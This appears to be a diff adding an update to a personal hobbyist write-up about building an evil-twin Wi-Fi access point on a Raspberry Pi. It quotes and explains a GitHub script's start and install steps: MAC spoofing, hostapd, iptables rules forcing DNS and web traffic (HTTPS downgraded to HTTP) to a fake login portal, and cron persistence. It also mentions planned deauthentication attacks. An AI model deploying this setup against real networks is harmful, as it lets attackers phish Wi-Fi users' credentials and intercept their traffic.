@@ -108,3 +108,77 @@ I guess i could try to figure out how to route all traffic to that page. If this
 
 So a DNS server will resolve different addresses to different IP's and then do protocol things. What if I make a DNS server that resolves everything to http://localhost/landingpage.php ? 
 
+# Update
+It's about 2 weeks later, and I have found a rpi evil-twin script on github. [link](https://github.com/NickJongens/PiEvilTwin) 
+
+I could just load this onto the RPi and let it work, but then I still won't know how to do this dns whitelist thing.
+
+Looking into the `dnsmasq.conf` file it is just redirecting a few pages to localhost. Also in the `hostapd.conf` file it shows minimal settings for the AP, which I find helpful.
+
+I dont get what the `overrid.conf` does so just going to ignore it till I get an error.
+## Start Script
+Looking at the start script it does a few things. (removing all the sleep commands)
+```bash
+service apache2 start
+ifconfig wlan0 down
+macchanger -A wlan0
+ifconfig wlan0 up
+hostapd -B /etc/hostapd/hostapd.conf
+ifconfig br0 up
+ifconfig br0 10.1.1.1 netmask 255.255.255.0
+sysctl net.ipv4.ip_forward=1
+iptables --flush
+iptables -t nat --flush
+iptables -t nat -A PREROUTING -i br0 -p udp -m udp --dport 53 -j DNAT --to-destination 10.1.1.1:53
+iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.1.1:80
+iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 443 -j DNAT --to-destination 10.1.1.1:80
+iptables -t nat -A POSTROUTING -j MASQUERADE
+service dnsmasq start
+service dnsmasq restart
+exit 0
+```
+
+So it starts a webserver, for the login portal then changes the mac address of the interface, Starts the AP and bridge interface. enables IPv4 forwarding, routes dns and http, and redirects https to http. Finally it starts the dnsmasq service.
+
+## A thought
+I wonder if i could run this on a pico W as it is just an AP?
+
+## Install script
+
+```bash
+apt-get install -y macchanger hostapd dnsmasq apache2 php
+
+cp -f hostapd.conf /etc/hostapd/
+cp -f dnsmasq.conf /etc/
+cp -Rf html /var/www/
+
+chown -R www-data:www-data /var/www/html
+chown root:www-data /var/www/html/.htaccess
+
+cp -f PiEvilTwinStart.sh /root/
+crontab -l | { cat; echo "@reboot sudo sleep 10 && sudo sh /root/PiEvilTwinStart.sh && sudo service dnsmasq restart &"; } | crontab -
+
+chmod +x /root/PiEvilTwinStart.sh
+cp -f override.conf /etc/apache2/conf-available/
+cd /etc/apache2/conf-enabled
+ln -s ../conf-available/override.conf override.conf
+cd /etc/apache2/mods-enabled
+
+ln -s ../mods-available/rewrite.load rewrite.load
+crontab -l | { cat; echo "@reboot sudo sleep 10 && sudo service dnsmasq restart &"; } | crontab -
+exit 0
+```
+
+This will install some packages, copy across the files, update some permissions, copy across the start script. Then makes a crontab (idk what this does), and starts the webserver. Creates a link for two files (`ln -s`).
+
+Looking back over the crontab I think it runs these commands. So It will run the start script before starting the webserver.
+
+# What's next?
+With all this I should be able to modify this eviltwin AP to be more suited to what I want to do and finally run it on the RPi and see if it works.
+
+I'm also planning to mess around with a pico W and do a similar thing. I could even get the pico W to do the deauth so I dont need a wifi extender on the RPi.
+
+If you read all this. Thanks I hope it helps! (and makes sense :eyes:) Stay safe. :)
+
+
+FIN
